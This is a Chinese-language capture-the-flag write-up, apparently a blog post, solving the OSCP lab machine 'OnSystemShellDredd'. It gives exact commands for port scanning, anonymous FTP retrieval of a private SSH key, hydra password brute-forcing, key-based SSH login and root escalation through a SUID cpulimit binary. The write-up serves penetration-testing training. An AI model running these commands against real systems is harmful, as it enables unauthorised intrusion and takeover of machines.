# 原创
：  OSCP靶机----OnSystemShellDredd

# OSCP靶机----OnSystemShellDredd

## 从WEB到内网&amp;&amp;FTP匿名&amp;&amp;SSH密钥登录&amp;&amp;SUID提权

今天来打一个OSCP的靶机，难度中等，包含了端口探测，服务探测，FTP匿名登录，ssh密钥登录，suid提权等等…靶场难度中等，需要收集两个flag，一个flag低权限shell就可以获取，第二个要提权后才可以获取。希望大家看完可以有所收获。

### 启动环境

启动VPN：`openvpn universal.ovpn`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/f3e06455118a86e9aa04b09bc02f52db.jpeg"/><br/> 攻击机IP为：192.168.45.173<br/> 启动靶机：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d4a25f980be4f66841b123174a1bd12f.jpeg"/><br/> 靶机IP为: 192.168.156.130

### 信息收集

#### 1.端口

nmap扫描端口<br/> `nmap --min-rate 10000 -p- 192.168.156.130`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ba0d35d100ada263b655bb63c3f6a38f.jpeg"/><br/> 目标开放了21，61000两个端口（多扫几遍，有时候一遍会不准确。)<br/> 详细探测一下端口信息。<br/> `nmap -p 21,61000 -sV 192.168.156.130`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c83acbd2ef29c6508285dc7f4cbf1f80.jpeg"/><br/> 这个靶机竟然没有http服务，很少见。那就围绕这两个端口往下走。

#### 2.端口测试

**2.1**21-ftp<br/> 拿到ftp，先试试匿名用户anonymous登录。<br/> ftp 192.168.156.130<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/14d4b854a741649e13056a8d7f0036b8.jpeg"/><br/> 匿名用户密码一般都是空或者Email，这里空密码直接登录成功了。

```
ftp文件收集：
binary    #以二进制模式传输文件，保证文件完整
ls -al
cd .hannah
ls -al
get id_rsa  #下载文件

```

经过ls查找，有一个id_rsa文件，直接下载下来，看一下有没有用。<br/> cat id_rsa<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/2d5cd91c70627bdd549888c6b06d7e5b.jpeg"/><br/> 内容加密了，待定。<br/> **2.2**61000-ssh<br/> 拿到ssh，老样子，先看下对应的版本有没有脚本可以利用<br/> `searchsploit OpenSSH 7.9`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a06775390e8e3a6f6ac9b9ee0185c55a.jpeg"/><br/> 没有，试一下手工登录。<br/> `ssh root@192.168.156.130 -p 61000`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7c54962f338dfef0365bbe9c99a3ad14.jpeg"/><br/> 失败，用hydra爆破吧。线程为6，字典用msf的。<br/> `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 -vV 192.168.156.130 ssh -s 61000`<br/> 等待…<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9e6634c0492640699e63314776fc30e9.png"/><br/> 没有爆出来。

### 攻击阶段

回到刚才收集到的id_rsa文件，看上去是base64加密的，试一下解密。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e8fb9c5fa6be9f63e513fecb4f092ba8.jpeg"/><br/> 解密后发现了root@OffShell，这应该就是shh登录密码，只是不知道用户，用文件ssh密钥。尝试登录：<br/> `ssh -i id_rsa root@192.168.156.130 -p 61000`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/dd6a26b5163e92c64a7135cded2ed04d.jpeg"/><br/> 密码错误，思路错了。可能不是root用户，倒回去是有一个.hannah文件的，试一下.hannah当用户登录。<br/> `ssh -i id_rsa .hannah@192.168.156.130 -p 61000`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/0b56c125eb65b32b465f9d1ea2f63971.jpeg"/><br/> .hannah不行，试一下hannah<br/> `ssh -i id_rsa hannah@192.168.156.130 -p 61000`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/50f98b9a5b25b9cd40914a69a249de21.jpeg"/><br/> 有不一样的东西出来了<br/> 这个错误It is required that your private key files are NOT accessible by others.翻译一下就是私钥文件不能被其他人访问，解决办法就是要让别人不可读写这个文件。<br/> 修改id_rsa权限：<br/> `chmod 600 id_rsa`<br/> `ssh -i id_rsa hannah@192.168.156.130 -p 61000`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ff08586a6ff1a947373509ba15d67230.jpeg"/><br/> 成功登录，有shell了。

### 内网渗透

获取flag1：<br/> `find / -name local.txt 2&gt;/dev/null`<br/> `cat /home/hannah/local.txt`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/cfee63b498755d0d0f38df0523f65fff.jpeg"/>

#### 提权

1.内核overlayfs提权<br/> `lsb_release -a`看看发行版本<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/319bcd1df29f4b2656013be9620b58c8.jpeg"/><br/> Debian，不能overlayfs提权<br/> 2.低内核版本提权<br/> `uname -a`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/fac4a5c1a2e92fd88c1f46a6c8a6e323.jpeg"/><br/> 4.19.0,不太行。<br/> 3.sudo提权<br/> `sudo -l`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/fed9ec27aee06ac3603c06933797e484.jpeg"/><br/> 不存在sudo<br/> 4.suid提权<br/> `find / -perm -u=s -type f 2&gt;/dev/null`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/47b5715a21895dde2aec84d9be5e51e9.jpeg"/><br/> 有一个没见过的cpulimit，去https://gtfobins.github.io搜一下<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/999d8e0ee672fec831631619668a692e.jpeg"/><br/> 果真有<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e2b2affe1aa84a3159d59d97f406301e.jpeg"/><br/> 直接用起来：<br/> `cpulimit -l 100 -f -- /bin/sh -p`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/42a64266b87c478f34cb0a8d55556255.jpeg"/><br/> 成功提到root权限！<br/> 获取flag2：<br/> `cat /root/proof.txt`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/eb5e6cc11834e5d61d3026f549518f1c.jpeg"/><br/> 完结。
